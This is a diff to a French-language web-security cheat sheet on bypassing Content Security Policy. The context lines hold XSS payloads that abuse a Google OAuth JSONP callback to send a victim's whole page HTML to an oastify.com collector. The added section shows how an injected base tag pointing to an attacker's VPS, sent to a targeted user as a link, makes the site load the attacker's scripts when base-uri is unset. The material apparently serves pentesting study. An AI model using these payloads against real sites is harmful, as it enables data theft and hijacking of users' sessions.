@@ -58,3 +58,12 @@ http://site.com//page?param_vuln="><script src=https://accounts.google.com/o/oau
 http://site.com//page?param_vuln="><script defer src=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(`https://bydmi3v6arev7jnqpydwkd1fm6sxg14q.oastify.com?x=${encodeURIComponent(document.documentElement.outerHTML)}`)></script>
 ```
 
+## Directive "base-uri" manquante 
+
+Si l'injection de balises est possible, mais que le CSP est bien configuré, mais que la directive "base-uri" n'est pas indiquée, on peut injecter une autre racine pour tous les scripts de la page qui sont spécifiés avec un chemin relatif : 
+
+    <base href='http://[VPS]:8000/xss'>
+
+En envoyant un lien à un autre utilisateur que l'on cible, il chargera tous les scripts de mon VPS au lieu des scripts du serveur web.
+
+
